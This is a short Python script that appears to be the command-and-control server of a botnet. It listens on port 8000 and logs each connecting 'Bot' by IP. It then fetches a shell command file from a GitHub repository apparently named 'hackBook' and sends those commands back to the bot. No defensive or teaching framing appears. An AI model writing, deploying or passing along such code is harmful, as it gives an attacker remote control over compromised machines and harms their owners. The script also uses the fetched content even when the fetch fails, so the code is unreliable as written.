# !/usr/bin/env python3
import base64
import socketserver
import requests


class BotHandler(socketserver.BaseRequestHandler):

    def handle(self):
        url = 'https://raw.githubusercontent.com/mishateml/hackBook/master/commands.sh'
        req = requests.get(url)
        if req.status_code == requests.codes.ok:
            con = req.content.decode()

        else:
            print('Content was not found.')

        self.data = self.request.recv(1024).strip()

        print("Bot with IP {} sent:".format(self.client_address[0]))
        print(self.data)
        self.request.sendall(con.encode())


HOST, PORT = "", 8000

tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)

try:

    tcpServer.serve_forever()

except:

    print("There was an error")
